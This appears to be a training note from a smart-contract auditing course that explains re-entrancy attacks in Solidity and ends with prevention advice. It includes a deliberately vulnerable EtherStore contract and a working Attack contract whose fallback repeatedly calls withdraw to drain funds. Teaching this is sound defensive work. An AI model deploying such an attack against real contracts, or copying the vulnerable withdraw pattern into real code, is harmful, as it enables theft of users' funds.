# Smart-contract-Audting-Training-week3-4-5-6

# Re-entrancy Attack 
What is a re-entrancy attack ?

Reentrancy is a smart-contract attack that occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.

When the contract fails to update its state before sending funds, the attacker can continuously call the contract's withdraw function and drain all the contract’s funds in the process.

Example of a reentrancy attack smart-contract
 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract EtherStore {
    mapping(address => uint) public balances;
 
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
 
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
 
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
 
        balances[msg.sender] = 0;
    }
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
contract Attack {
    EtherStore public etherStore;
 
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
 
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
 
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
 
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

In the etherstore contract the vulnerability comes when the contract sends the attacker their requested amount of ether. In this case, the attacker calls the withdraw() function. Since his balance has not yet been set to 0, he is able to transfer the tokens even though he has already received tokens.

Now, let's consider a malicious attacker creating the Attack contract.
The attack function calls the withdraw function in the etherstore contract. When the token is received, the payable fallback function calls back the withdraw function. Since the check is passed, the contract sends the token to the attacker, which triggers the fallback function again until all the funds are drained.

How to prevent against re-entrancy attack

Ensure all state changes happen before calling external contracts, i.e., update balances or code internally before calling external code.
Use function modifiers that prevent reentrancy.

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}